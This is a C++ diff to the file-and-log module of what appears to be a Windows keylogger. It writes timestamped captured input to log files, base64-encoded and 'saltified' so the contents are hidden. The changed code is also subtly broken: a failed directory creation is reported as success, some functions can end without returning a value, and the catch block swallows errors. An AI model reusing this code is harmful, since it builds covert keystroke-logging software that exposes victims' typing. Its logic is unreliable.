@@ -8,6 +8,8 @@
 #include "Auxiliary.h"
 #include "Encoder.h"
 
+using std::cout;
+
 //We will use this IO system to create files, store logs, deal with paths, etc...
 
 namespace IO
@@ -26,30 +28,30 @@ namespace IO
 
 	bool createDirectory(std::string dirPath)
 	{
-		//All this mumbo jumbo to convert the string object passed in into a LPCWSTR which the WinAPI function accepts
+		/* All this mumbo jumbo to convert the string object passed in 
+		into a LPCWSTR which the WinAPI function accepts. */
+
 		std::wstring tmp = std::wstring(dirPath.begin(), dirPath.end());
 		LPCWSTR dirPath2 = tmp.c_str();
 
-		return (bool)CreateDirectory(dirPath2, NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
-	}
+		/* This if funnel simply deals with the result of trying to create a directory. If it is successful,
+		then return true, if the target directory already exists, then also return true, however, if the target
+		path could not be located, then return false. */
 
-	//This function is essentially useless but I will remove it later
-
-	bool creatDirBackup(std::string dirPath)
-	{
-		for (auto& letter : dirPath)
+		if (CreateDirectory(dirPath2, NULL) == 0)
 		{
-			if (letter == '\\')
-			{
-				letter = '\0';
-				
-				if (!createDirectory(dirPath))
-				{
-					return false;
-				}
-
-				letter = '\\';
-			}
+			Auxiliary::logError("IO::createDirectory() - Directory created!");
+			return true;
+		}
+		else if(GetLastError() == ERROR_ALREADY_EXISTS)
+		{
+			Auxiliary::logError("IO::createDirectory() - Directory already exists!");
+			return true;
+		}
+		else if (GetLastError() == ERROR_PATH_NOT_FOUND)
+		{
+			Auxiliary::logError("IO::createDirectory() - Directory path not found!");
+			return false;
 		}
 	}
 
@@ -66,7 +68,7 @@ namespace IO
 		Auxiliary::DateTime dateTime;
 		
 		//We construct a filename with the date, time, and proper extension and seperators
-		std::string logName = dateTime.getTDString(".", "_") + ".log";
+		std::string logName = dateTime.getDTString(".", "-", "_") + ".log";
 
 		//We now make a full file path using both the log name and the write path
 		std::string filePath = writePath + logName;
@@ -81,35 +83,29 @@ namespace IO
 			//If log file could not be created for some reason, return empty string
 			if (!keyLog)
 			{
-				return "";
+				Auxiliary::logError("writeToLog() - Could not create log file!");
 			}
-
-			//Otherwise create a string stream
-			std::ostringstream outputStream;
-
-			//Insert given data and timestamps to stream
-			outputStream << "[" << dateTime.getTDString("/", ":") << "]" << std::endl << input << std::endl;
-
-			//Encode and saltify that data
-			std::string data = Encoder::saltify(Encoder::b64Encode(outputStream.str()));
-
-			//Write that data into the file
-			keyLog << data;
-
-			//Check log file existence once more
-			if (!keyLog)
+			else
 			{
-				return "";
+				std::ostringstream outputStream;
+
+				//Insert given data and timestamps to stream
+				outputStream << "[" << dateTime.getDTString("/", " ", ":") << "]" << std::endl << input << std::endl;
+
+				//Encode and saltify that data
+				std::string insertData = Encoder::saltify(Encoder::b64Encode(outputStream.str()));
+
+				//Write that data into the file
+				keyLog << insertData;
 			}
 
-			//If all is good, close the file and return the name
+			//Close the file and return the path to the log
+
 			keyLog.close();
 			return filePath;
 		}
 		catch(...)
-		{
-			return "";
-		}
+		{	}
 	}
 }
 
